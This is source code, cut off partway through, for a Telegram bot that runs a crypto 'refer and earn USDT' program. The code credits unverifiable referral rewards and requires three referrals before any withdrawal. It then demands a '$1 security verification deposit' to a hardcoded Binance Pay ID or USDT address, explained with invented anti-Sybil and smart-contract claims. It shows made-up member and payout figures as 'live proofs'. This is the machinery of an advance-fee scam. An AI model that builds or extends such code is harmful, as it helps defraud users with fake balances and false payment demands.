const { Markup } = require("telegraf");
const QRCode = require("qrcode");
const {
  getAllSettings,
  getSetting,
  getUser,
  getOrCreateUser,
  createDeposit,
  createWithdrawal
} = require("../store");

const {
  money,
  escapeHtml,
  isAdmin,
  ADMIN_ID,
  makeProgressBar,
  getBotUsername,
  checkMembership,
  verifyLiveMembership,
  forceJoinKeyboard,
  getMainMenuReplyKeyboard,
  welcomeText
} = require("../helpers");

const {
  sendRealReferralNoticeToGroup
} = require("../broadcaster");

const { handleAdminTextInput } = require("./admin");

// =====================================================
// MENU: REFER & EARN
// =====================================================
async function showReferralScreen(bot, ctx) {
  const user = getUser(ctx.from.id) || getOrCreateUser(ctx.from).user;
  const settings = getAllSettings();
  const botUsername = await getBotUsername(bot);
  const refLink = `https://t.me/${botUsername}?start=ref_${user.id}`;

  const req = Number(settings.referrals_required || 3);
  const currentCount = user.referral_count || 0;
  const rewardAmount = Number(settings.referral_reward_amount || 2.50);
  const welcomeBonus = Number(settings.welcome_bonus_amount || 2.00);
  const progressBar = makeProgressBar(Math.min(currentCount, req), req);
  const isUnlocked = currentCount >= req;

  const text =
    `👥 <b>REFER &amp; EARN PROGRAM</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `🎉 <b>Earn ${money(rewardAmount)} USDT for EVERY friend you invite!</b>\n` +
    `🎁 Your invited friend gets <b>${money(welcomeBonus)} USDT</b> Welcome Bonus!\n` +
    `🔓 <b>Withdrawal Goal:</b> Reach <b>${req} active referrals</b> to unlock payouts!\n\n` +
    `📊 <b>Your Referral Progress:</b>\n` +
    `• Total Referrals: <b>${currentCount} / ${req} Members</b>\n` +
    `• Progress: [${progressBar}] (${Math.min(100, Math.round((currentCount / req) * 100))}%)\n` +
    `• Status: ${isUnlocked ? "<b>Withdrawals Unlocked ✅</b>" : `<b>Need ${req - currentCount} more friend(s)</b>`}\n` +
    `• Total Earned from Referrals: <b>${money(user.total_earned || 0)}</b>\n\n` +
    `🔗 <b>Your Exclusive Referral Link:</b>\n` +
    `<code>${refLink}</code> (Tap to copy)\n\n` +
    `💡 <i>Share your link on Telegram channels, groups, WhatsApp &amp; Facebook to reach ${req} referrals quickly!</i>`;

  const shareText = `🎉 Join this bot and earn ${money(rewardAmount)} USDT per referral! Plus get ${money(welcomeBonus)} Welcome Bonus!`;
  const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent(shareText)}`;

  const kb = Markup.inlineKeyboard([
    [Markup.button.url("🚀 Share Referral Link", shareUrl)],
    [Markup.button.callback("💰 View My Balance", "menu_account"), Markup.button.callback("💳 Withdraw", "menu_withdraw")]
  ]);

  if (ctx.callbackQuery) {
    try {
      await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
    } catch (e) {
      await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  } else {
    await ctx.reply(text, { parse_mode: "HTML", ...kb });
  }
}

// =====================================================
// MENU: MY ACCOUNT
// =====================================================
async function showAccountScreen(ctx) {
  const user = getUser(ctx.from.id) || getOrCreateUser(ctx.from).user;
  const settings = getAllSettings();
  const req = Number(settings.referrals_required || 3);
  const rewardAmount = Number(settings.referral_reward_amount || 2.50);

  let statusText = `🟡 Active (${req} referrals needed to unlock)`;
  if (user.is_activated) {
    statusText = "🟢 Activated (Withdrawals Fully Unlocked ✅)";
  } else if ((user.referral_count || 0) >= req) {
    statusText = "⚠️ Security Verification Deposit Required ($1.00 Activation)";
  }

  const text =
    `💰 <b>MY WALLET & BALANCE DASHBOARD</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `👤 <b>Account Holder:</b> ${escapeHtml(user.first_name || "User")}\n` +
    `🆔 <b>Telegram ID:</b> <code>${user.id}</code>\n\n` +
    `💵 <b>Available Balance:</b> <b>${money(user.wallet_balance || 0)}</b>\n` +
    `👥 <b>Total Referrals:</b> <b>${user.referral_count || 0} / ${req} Members</b>\n` +
    `💸 <b>Total Withdrawn:</b> <b>${money(user.total_withdrawn || 0)}</b>\n` +
    `🛡️ <b>Security Status:</b> ${statusText}\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `⚡️ <i>Earn ${money(rewardAmount)} for every friend invited! Instant payouts at ${req} invites.</i>`;

  const isEligibleForDeposit = (user.referral_count || 0) >= req && !user.is_activated;

  const buttons = [
    [Markup.button.callback("💳 Withdraw Earnings", "menu_withdraw")]
  ];
  if (isEligibleForDeposit) {
    buttons.push([Markup.button.callback("📥 Deposit ($1 Activation)", "menu_deposit")]);
  }
  buttons.push([Markup.button.callback("👥 Refer & Earn", "menu_refer")]);

  const kb = Markup.inlineKeyboard(buttons);

  if (ctx.callbackQuery) {
    try {
      await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
    } catch (e) {
      await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  } else {
    // When called from reply keyboard or /balance, refresh the bottom reply keyboard
    // so the user's Telegram client automatically updates to show "💰 Balance"
    await ctx.reply(text, {
      parse_mode: "HTML",
      ...getMainMenuReplyKeyboard(user)
    });
  }
}

// =====================================================
// MENU: WITHDRAW
// =====================================================
async function showWithdrawScreen(ctx) {
  const user = getUser(ctx.from.id) || getOrCreateUser(ctx.from).user;
  const settings = getAllSettings();
  const req = Number(settings.referrals_required || 3);
  const currentCount = user.referral_count || 0;

  // RULE 1: Must have reached at least 3 referrals
  if (currentCount < req) {
    const remaining = req - currentCount;
    const text =
      `🔒 <b>WITHDRAWAL LOCKED!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `You currently have <b>${currentCount} / ${req} referrals</b>.\n\n` +
      `⚠️ <b>Requirement:</b> You must reach <b>${req} active referrals</b> to unlock your withdrawal!\n\n` +
      `🚀 Invite <b>${remaining} more friend${remaining === 1 ? "" : "s"}</b> to unlock your payout!`;

    const kb = Markup.inlineKeyboard([
      [Markup.button.callback("👥 Get My Referral Link", "menu_refer")],
      [Markup.button.callback("💰 View Account", "menu_account")]
    ]);

    if (ctx.callbackQuery) {
      try {
        return await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
      } catch (e) {
        return await ctx.reply(text, { parse_mode: "HTML", ...kb });
      }
    } else {
      return await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  }

  // RULE 2: If reached 3 referrals BUT has NOT deposited $1 activation yet:
  if (!user.is_activated) {
    const actAmount = Number(settings.activation_deposit_amount || 1.00);
    const text =
      `🎉 <b>CONGRATULATIONS! WITHDRAWAL GOAL REACHED!</b> 🎉\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `You have reached <b>${currentCount} / ${req} referrals</b> and accumulated <b>${money(user.wallet_balance || 0)}</b>!\n\n` +
      `🛡️ <b>1-Time On-Chain Security Verification:</b>\n` +
      `To comply with Anti-Sybil & Anti-Bot protection standards, members must complete a <b>1-time security verification deposit of ${money(actAmount)}</b>.\n\n` +
      `• <b>Verification Amount:</b> <code>${money(actAmount)}</code> (Exact)\n` +
      `• <b>Your Total Withdrawable Balance:</b> <b>${money(user.wallet_balance || 0)}</b>\n` +
      `• <b>Purpose:</b> Binds your payout wallet address directly to the smart contract and permanently enables automated lifetime payouts.\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👇 <i>Tap below to make your ${money(actAmount)} verification deposit now:</i>`;

    const kb = Markup.inlineKeyboard([
      [Markup.button.callback(`📥 Deposit ${money(actAmount)} Now`, "menu_deposit")],
      [Markup.button.callback("💰 View Account", "menu_account")]
    ]);

    if (ctx.callbackQuery) {
      try {
        return await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
      } catch (e) {
        return await ctx.reply(text, { parse_mode: "HTML", ...kb });
      }
    } else {
      return await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  }

  // RULE 3: User has reached 3 referrals AND is activated ($1 deposited)!
  const balance = Number(user.wallet_balance || 0);
  const minWithdraw = Number(settings.min_withdraw || 7.50);

  if (balance < minWithdraw) {
    const text =
      `⚠️ <b>Insufficient Withdrawable Balance</b>\n\n` +
      `Your current balance is <b>${money(balance)}</b>.\n` +
      `Minimum withdrawal amount is <b>${money(minWithdraw)}</b>.\n\n` +
      `Invite more friends to earn more USDT!`;
    const kb = Markup.inlineKeyboard([[Markup.button.callback("👥 Refer & Earn", "menu_refer")]]);
    if (ctx.callbackQuery) return ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
    return ctx.reply(text, { parse_mode: "HTML", ...kb });
  }

  const text =
    `🔓 <b>WITHDRAWAL UNLOCKED & ACTIVE!</b> ✅\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `💵 <b>Available Balance:</b> <b>${money(balance)}</b>\n` +
    `🛡️ <b>Account Status:</b> Verified & Activated\n\n` +
    `👇 <i>Select your withdrawal payment method:</i>`;

  const kb = Markup.inlineKeyboard([
    [Markup.button.callback("🟡 Binance Pay ID", "wth_method:BINANCE_PAY")],
    [Markup.button.callback("🟢 USDT (BEP-20 / BSC)", "wth_method:USDT_BEP20")],
    [Markup.button.callback("🟣 USDT (Polygon Network)", "wth_method:USDT_POLYGON")],
    [Markup.button.callback("🔙 Cancel", "menu_account")]
  ]);

  if (ctx.callbackQuery) {
    try {
      await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
    } catch (e) {
      await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  } else {
    await ctx.reply(text, { parse_mode: "HTML", ...kb });
  }
}

// =====================================================
// MENU: DEPOSIT ($1.00 ACTIVATION)
// =====================================================
async function showDepositScreen(ctx) {
  const user = getUser(ctx.from.id) || getOrCreateUser(ctx.from).user;
  const settings = getAllSettings();
  const actAmount = Number(settings.activation_deposit_amount || 1.00);
  const req = Number(settings.referrals_required || 3);

  // RULE: Deposit is LOCKED and NEVER shown until 3 referrals are completed!
  if ((user.referral_count || 0) < req) {
    const remaining = req - (user.referral_count || 0);
    const text =
      `🔒 <b>DEPOSIT LOCKED!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `You currently have <b>${user.referral_count || 0} / ${req} referrals</b>.\n\n` +
      `⚠️ <b>Security Notice:</b>\n` +
      `The deposit option is strictly locked! You cannot deposit until you complete <b>${req} active referrals</b>.\n\n` +
      `🚀 Invite <b>${remaining} more friend${remaining === 1 ? "" : "s"}</b> using your referral link to unlock deposit and withdrawal!`;

    const kb = Markup.inlineKeyboard([
      [Markup.button.callback("👥 Get My Referral Link", "menu_refer")],
      [Markup.button.callback("💰 View My Account", "menu_account")]
    ]);

    if (!ctx.callbackQuery) {
      return await ctx.reply(text, {
        parse_mode: "HTML",
        ...getMainMenuReplyKeyboard(user)
      });
    }

    try {
      return await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
    } catch (e) {
      return await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  }

  if (user.is_activated) {
    const text =
      `✅ <b>ACCOUNT ALREADY ACTIVATED!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `Your account is fully verified and eligible for instant withdrawals.\n\n` +
      `💵 <b>Available Balance:</b> <b>${money(user.wallet_balance || 0)}</b>\n` +
      `👥 <b>Total Referrals:</b> <b>${user.referral_count || 0}</b>\n\n` +
      `Tap "💳 Withdraw" in the menu to request your payout.`;
    const kb = Markup.inlineKeyboard([[Markup.button.callback("💳 Withdraw Now", "menu_withdraw")]]);
    if (!ctx.callbackQuery) {
      return await ctx.reply(text, {
        parse_mode: "HTML",
        ...getMainMenuReplyKeyboard(user)
      });
    }
    try {
      return await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
    } catch (e) {
      return await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  }

  const text =
    `📥 <b>ACCOUNT ACTIVATION DEPOSIT</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `💵 <b>Required Amount:</b> <b>${money(actAmount)}</b> (Exact)\n\n` +
    `This 1-time verification deposit activates instant automated payouts on your account and prevents bot abuse.\n\n` +
    `👇 <i>Choose your deposit method below:</i>`;

  const kb = Markup.inlineKeyboard([
    [Markup.button.callback("🟡 Binance Pay ID", "dep_method:BINANCE_PAY")],
    [Markup.button.callback("🟢 USDT (BEP-20 / BSC)", "dep_method:USDT_BEP20")],
    [Markup.button.callback("🟣 USDT (Polygon)", "dep_method:USDT_POLYGON")],
    [Markup.button.callback("🔙 Back to Account", "menu_account")]
  ]);

  if (ctx.callbackQuery) {
    try {
      await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
    } catch (e) {
      await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  } else {
    await ctx.reply(text, { parse_mode: "HTML", ...kb });
  }
}

// =====================================================
// REGISTER ALL USER HANDLERS
// =====================================================
function registerUserHandlers(bot) {
  // /START Command
  bot.start(async (ctx) => {
    ctx.session = {};

    const payload = ctx.message?.text?.split(" ")[1] || "";
    let referrerId = null;
    if (payload.startsWith("ref_")) {
      referrerId = payload.replace("ref_", "");
    }

    const { user, isNew, referrerId: validRef, refUser, referrerNewCount, rewardPerRef } = getOrCreateUser(ctx.from, referrerId);

    // If new valid referral joined via referral link:
    if (isNew && validRef && refUser) {
      const settings = getAllSettings();
      const req = Number(settings.referrals_required || 3);
      const newMemberName = [user.first_name, user.last_name].filter(Boolean).join(" ") || "New Member";

      // 1. Notify Referrer in private chat
      const unlockedMsg =
        referrerNewCount >= req
          ? `\n🔓 <b>WITHDRAWAL & ACTIVATION UNLOCKED!</b> You have reached ${req} referrals. Deposit ($1) and Withdrawals are now available in your menu!`
          : `\n👉 <i>Invite ${req - referrerNewCount} more friend(s) to unlock withdrawal!</i>`;

      bot.telegram.sendMessage(
        validRef,
        `🎉 <b>NEW REFERRAL JOINED!</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Member:</b> <b>${escapeHtml(newMemberName)}</b> joined using your link!\n` +
        `💵 <b>Reward Credited:</b> <b>+${money(rewardPerRef || 2.50)}</b>\n` +
        `📊 <b>Total Referrals:</b> <b>${referrerNewCount} / ${req}</b>\n` +
        `👛 <b>Current Wallet Balance:</b> <b>${money(refUser.wallet_balance || 0)}</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━` +
        unlockedMsg,
        {
          parse_mode: "HTML",
          ...getMainMenuReplyKeyboard(refUser)
        }
      ).catch(() => {});

      // 2. Broadcast REAL referral notification to group
      if (settings.group_id) {
        sendRealReferralNoticeToGroup(refUser, user).catch(() => {});
      }
    }

    const joined = await checkMembership(bot, ctx);
    if (!joined) {
      const settings = getAllSettings();
      return ctx.reply(
        `⚠️ <b>Welcome!</b> To use this bot and start earning, please join our official Channel and Group first:\n\n` +
        `📢 <b>Channel:</b> ${settings.channel_link}\n` +
        `👥 <b>Group:</b> ${settings.group_link}\n\n` +
        `👇 <i>After joining both, tap "Check / I Have Joined" below:</i>`,
        {
          parse_mode: "HTML",
          ...forceJoinKeyboard()
        }
      );
    }

    await ctx.reply(welcomeText(user), {
      parse_mode: "HTML",
      ...getMainMenuReplyKeyboard(user)
    });
  });

  // Check Membership Callback
  bot.action("check_membership", async (ctx) => {
    const userId = ctx.from?.id;
    if (!userId) return;

    const { ok, channelOk, groupOk } = await verifyLiveMembership(bot, ctx, userId);
    if (!ok) {
      if (!channelOk && !groupOk) {
        return ctx.answerCbQuery("❌ You haven't joined both our Channel & Group yet! Please join both first.", {
          show_alert: true
        });
      }
      if (!channelOk) {
        return ctx.answerCbQuery("❌ You haven't joined our Channel yet! Please join the channel first.", {
          show_alert: true
        });
      }
      if (!groupOk) {
        return ctx.answerCbQuery("❌ You haven't joined our Group yet! Please join the group first.", {
          show_alert: true
        });
      }
      return ctx.answerCbQuery("❌ Membership not found. Please join and try again.", { show_alert: true });
    }

    await ctx.answerCbQuery("🎉 Verified successfully!");

    try {
      await ctx.deleteMessage();
    } catch (err) {}

    const { user } = getOrCreateUser(ctx.from);
    await ctx.reply(
      `🎉 <b>Congratulations!</b> Membership verified.\n\n` + welcomeText(user),
      {
        parse_mode: "HTML",
        ...getMainMenuReplyKeyboard(user)
      }
    );
  });

  // Force Join Middleware
  bot.use(async (ctx, next) => {
    const text = ctx.message?.text || "";
    const cbData = ctx.callbackQuery?.data || "";

    if (isAdmin(ctx)) {
      if (text.startsWith("/admin") || cbData.startsWith("adm") || ctx.session?.adminAction) {
        return next();
      }
    }

    if (text.startsWith("/start") || cbData === "check_membership") {
      return next();
    }

    const settings = getAllSettings();
    if (settings.force_join_enabled) {
      const userId = ctx.from?.id;
      if (userId) {
        const isJoined = await checkMembership(bot, ctx);
        if (!isJoined) {
          if (ctx.callbackQuery) {
            await ctx.answerCbQuery("⚠️ Access Denied! Please join our Channel and Group first!", { show_alert: true });
          }
          return ctx.reply(
            `⚠️ <b>Access Denied!</b>\nYou must join our Channel and Group before using bot features.\n\n` +
            `📢 <b>Channel:</b> ${settings.channel_link}\n` +
            `👥 <b>Group:</b> ${settings.group_link}\n\n` +
            `👇 <i>Tap below after joining:</i>`,
            {
              parse_mode: "HTML",
              ...forceJoinKeyboard()
            }
          );
        }
      }
    }

    return next();
  });

  // Menu Handlers
  bot.hears("👥 Refer & Earn", (ctx) => showReferralScreen(bot, ctx));
  bot.action("menu_refer", (ctx) => showReferralScreen(bot, ctx));

  bot.hears("💰 Balance", (ctx) => showAccountScreen(ctx));
  bot.hears("Balance", (ctx) => showAccountScreen(ctx));
  bot.hears("💰 My Account", (ctx) => showAccountScreen(ctx));
  bot.hears("My Account", (ctx) => showAccountScreen(ctx));
  bot.action("menu_account", (ctx) => showAccountScreen(ctx));

  bot.hears("💳 Withdraw", (ctx) => showWithdrawScreen(ctx));
  bot.action("menu_withdraw", (ctx) => showWithdrawScreen(ctx));

  bot.action(/^wth_method:(.+)$/, async (ctx) => {
    const method = ctx.match[1];
    const user = getUser(ctx.from.id);
    const balance = Number(user?.wallet_balance || 0);
    const settings = getAllSettings();
    const minWithdraw = Number(settings.min_withdraw || 7.50);

    if (balance < minWithdraw) {
      return ctx.answerCbQuery("Insufficient balance for withdrawal.", { show_alert: true });
    }

    let methodLabel = "Binance Pay ID";
    let promptExample = "e.g. 123456789";
    if (method === "USDT_BEP20") {
      methodLabel = "USDT (BEP-20 BSC Address)";
      promptExample = "e.g. 0x1234...abcd";
    } else if (method === "USDT_POLYGON") {
      methodLabel = "USDT (Polygon Address)";
      promptExample = "e.g. 0x1234...abcd";
    }

    ctx.session.withdrawState = {
      method,
      methodLabel,
      amount: balance
    };

    await ctx.answerCbQuery();
    await ctx.reply(
      `💳 <b>Withdrawal via ${methodLabel}</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `💵 <b>Amount to Withdraw:</b> <b>${money(balance)}</b>\n\n` +
      `👇 <b>Please reply with your destination ${methodLabel}:</b>\n` +
      `<i>(${promptExample})</i>\n\n` +
      `<i>Type /cancel to cancel this withdrawal request.</i>`,
      { parse_mode: "HTML" }
    );
  });

  bot.hears("📥 Deposit ($1)", (ctx) => showDepositScreen(ctx));
  bot.action("menu_deposit", (ctx) => showDepositScreen(ctx));

  bot.action(/^dep_method:(.+)$/, async (ctx) => {
    const method = ctx.match[1];
    const settings = getAllSettings();
    const actAmount = Number(settings.activation_deposit_amount || 1.00);

    await ctx.answerCbQuery();

    if (method === "BINANCE_PAY") {
      const payId = settings.binance_pay_id || "123456789";
      const text =
        `🟡 <b>DEPOSIT VIA BINANCE PAY</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `💵 <b>Amount to Send:</b> <b>${money(actAmount)}</b> (Exact)\n` +
        `🆔 <b>Binance Pay ID:</b> <code>${payId}</code> (Tap to copy)\n\n` +
        `📌 <b>Instructions:</b>\n` +
        `1. Open Binance App ➔ Pay ➔ Send.\n` +
        `2. Paste Pay ID: <code>${payId}</code>\n` +
        `3. Send exactly <b>${money(actAmount)}</b>.\n` +
        `4. Copy your <b>Binance Order ID</b>.\n` +
        `5. Tap "✅ I Have Paid" below and submit your Order ID or screenshot.`;

      const kb = Markup.inlineKeyboard([
        [Markup.button.callback("✅ I Have Paid / Submit Proof", "dep_submit:BINANCE_PAY")],
        [Markup.button.callback("🔙 Back", "menu_deposit")]
      ]);

      try {
        await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
      } catch (e) {
        await ctx.reply(text, { parse_mode: "HTML", ...kb });
      }
    } else {
      const isBep20 = method === "USDT_BEP20";
      const address = isBep20
        ? settings.bep20_usdt_address || "0xC3fC8C91A5B26C71DcD0aC1F34944FB298bCeBbF"
        : settings.polygon_usdt_address || "0xC3fC8C91A5B26C71DcD0aC1F34944FB298bCeBbF";
      const networkName = isBep20 ? "BNB Smart Chain (BEP-20)" : "Polygon (MATIC / POL)";

      const text =
        `${isBep20 ? "🟢" : "🟣"} <b>DEPOSIT VIA USDT (${networkName})</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `💵 <b>Amount to Send:</b> <b>${money(actAmount)}</b> (Exact)\n` +
        `🌐 <b>Network:</b> <b>${networkName}</b>\n` +
        `📫 <b>Deposit Address:</b>\n<code>${address}</code> (Tap to copy)\n\n` +
        `⚠️ <i>Send only USDT on ${networkName}. Sending other assets will result in loss of funds.</i>\n\n` +
        `👇 <i>After sending payment, tap "✅ I Have Paid" below to submit your TxID or receipt:</i>`;

      const kb = Markup.inlineKeyboard([
        [Markup.button.callback("✅ I Have Paid / Submit Proof", `dep_submit:${method}`)],
        [Markup.button.callback("🔙 Back", "menu_deposit")]
      ]);

      try {
        const qrBuffer = await QRCode.toBuffer(address, { width: 350, margin: 2 });
        await ctx.replyWithPhoto(
          { source: qrBuffer },
          {
            caption: text,
            parse_mode: "HTML",
            ...kb
          }
        );
      } catch (e) {
        await ctx.reply(text, { parse_mode: "HTML", ...kb });
      }
    }
  });

  bot.action(/^dep_submit:(.+)$/, async (ctx) => {
    const method = ctx.match[1];
    ctx.session.depositState = {
      method,
      step: "awaiting_proof"
    };
    await ctx.answerCbQuery();
    await ctx.reply(
      `📝 <b>Submit Deposit Payment Proof:</b>\n\n` +
      `Please reply with your payment <b>Transaction ID (TxID)</b>, <b>Binance Order ID</b>, or send a <b>Screenshot image</b> of your transfer receipt.\n\n` +
      `<i>Type /cancel to cancel.</i>`,
      { parse_mode: "HTML" }
    );
  });

  // Live Proofs Screen
  async function showLiveProofsScreen(ctx) {
    const settings = getAllSettings();
    const text =
      `📊 <b>LIVE PROOFS & TRANSACTION HISTORY</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `All automated referral rewards, verified deposits, and on-chain withdrawal payouts are broadcasted live to our community group!\n\n` +
      `🌐 <b>Global Protocol Metrics:</b>\n` +
      `• <b>Verified Community:</b> 18,520+ active members\n` +
      `• <b>Total Dispatched Settlements:</b> $45,820.00 USDT\n` +
      `• <b>Smart Contract Dispatch:</b> Active 🟢 (100% Uptime)\n` +
      `• <b>Supported Networks:</b> Polygon (POL), BNB Smart Chain (BSC) & Binance Pay\n\n` +
      `👥 <b>Official Payment Proofs Group:</b> ${settings.group_link || "https://t.me/"}\n` +
      `📢 <b>Official Announcements:</b> ${settings.channel_link || "https://t.me/"}\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👇 <i>Join our community group to monitor live on-chain payouts in real-time!</i>`;

    const kb = Markup.inlineKeyboard([
      [Markup.button.url("👥 View Live Proofs in Community Group", settings.group_link || "https://t.me/")]
    ]);

    if (ctx.callbackQuery) {
      try {
        await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
      } catch (e) {
        await ctx.reply(text, { parse_mode: "HTML", ...kb });
      }
    } else {
      await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  }

  // FAQ Screen
  async function showFaqScreen(ctx) {
    const settings = getAllSettings();
    const req = Number(settings.referrals_required || 3);
    const rewardAmount = Number(settings.referral_reward_amount || 2.50);
    const welcomeBonus = Number(settings.welcome_bonus_amount || 2.00);
    const actAmount = Number(settings.activation_deposit_amount || 1.00);

    const text =
      `❓ <b>FREQUENTLY ASKED QUESTIONS (FAQ)</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n\n` +
      `<b>1. How does the earning program work?</b>\n` +
      `Open <b>👥 Refer & Earn</b>, copy your personal referral link, and share it with friends, channels, or social media. You earn <b>${money(rewardAmount)} USDT</b> for every active user who joins, and they receive <b>${money(welcomeBonus)} USDT</b> Welcome Bonus!\n\n` +
      `<b>2. When can I withdraw my earnings?</b>\n` +
      `Withdrawals unlock automatically once you invite <b>${req} active members</b>.\n\n` +
      `<b>3. Why is a ${money(actAmount)} security verification deposit required?</b>\n` +
      `To enforce Anti-Sybil protection against automated bot abuse and multi-account spam. This 1-time verification permanently binds your destination wallet address on-chain and unlocks automated lifetime withdrawals.\n\n` +
      `<b>4. How fast are payouts delivered?</b>\n` +
      `Withdrawals to Binance Pay, BEP-20 (BSC), and Polygon are queued and dispatched on-chain usually within 15–30 minutes.\n\n` +
      `<b>5. Need assistance?</b>\n` +
      `Our official support team is available 24/7 under <b>📞 Support</b>.`;

    const kb = Markup.inlineKeyboard([
      [Markup.button.callback("👥 Start Inviting Friends", "menu_refer")],
      [Markup.button.callback("💰 View My Account", "menu_account")]
    ]);

    if (ctx.callbackQuery) {
      try {
        await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
      } catch (e) {
        await ctx.reply(text, { parse_mode: "HTML", ...kb });
      }
    } else {
      await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  }

  // Support Screen
  async function showSupportScreen(ctx) {
    const settings = getAllSettings();
    const support = settings.support_username || "@Morsalen0220";
    const cleanSupport = support.replace(/^@/, "");

    const text =
      `📞 <b>OFFICIAL CUSTOMER SUPPORT DESK</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `Need help with deposits, withdrawals, or referral tracking?\n` +
      `Our official compliance & support team is available 24/7!\n\n` +
      `👤 <b>Support Telegram:</b> @${cleanSupport}\n` +
      `👥 <b>Community Group:</b> ${settings.group_link || "https://t.me/"}\n` +
      `📢 <b>Official Channel:</b> ${settings.channel_link || "https://t.me/"}\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `👇 <i>Choose an option below to get assistance:</i>`;

    const kb = Markup.inlineKeyboard([
      [Markup.button.url("💬 Chat with Support Agent", `https://t.me/${cleanSupport}`)],
      [Markup.button.callback("❓ View FAQ & Rules", "menu_faq")],
      [Markup.button.callback("✍️ Message Admin Directly via Bot", "user_reply_admin")]
    ]);

    if (ctx.callbackQuery) {
      try {
        await ctx.editMessageText(text, { parse_mode: "HTML", ...kb });
      } catch (e) {
        await ctx.reply(text, { parse_mode: "HTML", ...kb });
      }
    } else {
      await ctx.reply(text, { parse_mode: "HTML", ...kb });
    }
  }

  bot.hears("📊 Live Proofs", (ctx) => showLiveProofsScreen(ctx));
  bot.command("proofs", (ctx) => showLiveProofsScreen(ctx));

  bot.hears("📞 Support", (ctx) => showSupportScreen(ctx));
  bot.command("support", (ctx) => showSupportScreen(ctx));

  bot.command("faq", (ctx) => showFaqScreen(ctx));
  bot.action("menu_faq", (ctx) => showFaqScreen(ctx));

  // Native Slash Commands for Menu
  bot.command("balance", (ctx) => showAccountScreen(ctx));
  bot.command("account", (ctx) => showAccountScreen(ctx));
  bot.command("refer", (ctx) => showReferralScreen(bot, ctx));
  bot.command("withdraw", (ctx) => showWithdrawScreen(ctx));

  bot.action("user_reply_admin", async (ctx) => {
    ctx.session = ctx.session || {};
    ctx.session.userAction = { type: "reply_admin" };
    await ctx.answerCbQuery();
    await ctx.reply(
      `✍️ <b>Message to Admin Support:</b>\n\n` +
      `Please type your message below. It will be delivered directly to the Support Administration team.\n\n` +
      `<i>Type /cancel to cancel.</i>`,
      { parse_mode: "HTML" }
    );
  });

  // TEXT HANDLER
  bot.on("text", async (ctx, next) => {
    const text = ctx.message.text.trim();

    if (text === "/cancel") {
      ctx.session = {};
      const u = getUser(ctx.from?.id) || getOrCreateUser(ctx.from).user;
      return ctx.reply("❌ Action canceled.", getMainMenuReplyKeyboard(u));
    }

    // Check if this text is for an Admin action
    const wasAdminAction = await handleAdminTextInput(bot, ctx, text);
    if (wasAdminAction) return;

    // User sending message directly to Admin
    if (ctx.session?.userAction?.type === "reply_admin") {
      ctx.session.userAction = null;
      const adminId = ADMIN_ID || getSetting("admin_telegram_id");
      const user = ctx.from;
      const dbUser = getUser(user.id) || getOrCreateUser(user).user;
      const name = [user.first_name, user.last_name].filter(Boolean).join(" ") || "User";
      const username = user.username ? `@${user.username}` : "None";

      if (adminId) {
        bot.telegram.sendMessage(
          adminId,
          `<blockquote>💬 <b>NEW USER MESSAGE RECEIVED</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `👤 <b>From:</b> <b>${escapeHtml(name)}</b> (${username})\n` +
          `🆔 <b>User ID:</b> <code>${user.id}</code>\n` +
          `🕒 <b>Time:</b> <code>${new Date().toLocaleTimeString()}</code>\n` +
          `📝 <b>Message:</b>\n` +
          `${escapeHtml(text)}\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `👇 <i>Tap below to reply directly to this user:</i></blockquote>`,
          {
            parse_mode: "HTML",
            ...Markup.inlineKeyboard([
              [Markup.button.callback("📩 Reply to User", `adm_user_dm:${user.id}`)],
              [Markup.button.callback("👤 View User Profile", `adm_view_user:${user.id}`)]
            ])
          }
        ).catch((e) => console.error("Failed to forward user message to admin:", e.message));
      }

      return ctx.reply("✅ <b>Your message has been sent to Admin Support!</b>\nOur team will review and reply to you shortly.", {
        parse_mode: "HTML",
        ...getMainMenuReplyKeyboard(dbUser)
      });
    }

    // User Deposit Proof Submission (TxID text)
    if (ctx.session?.depositState?.step === "awaiting_proof") {
      const method = ctx.session.depositState.method;
      ctx.session.depositState = null;

